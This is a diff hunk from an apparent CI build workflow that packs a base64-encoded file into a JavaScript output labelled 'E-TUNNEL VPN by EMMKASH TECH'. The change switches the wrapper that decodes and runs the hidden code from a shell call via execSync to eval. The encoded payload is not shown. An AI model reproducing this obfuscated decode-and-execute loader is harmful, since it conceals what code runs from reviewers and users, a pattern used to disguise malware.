@@ -123,7 +123,7 @@ jobs:
 
             (
               printf '%s\n' '// E-TUNNEL VPN by EMMKASH TECH'
-              printf 'require("child_process").execSync(Buffer.from("'
+              printf 'eval(Buffer.from("'
               cat "$b64file"
               printf '","base64").toString());\n'
             ) > "$outfile"
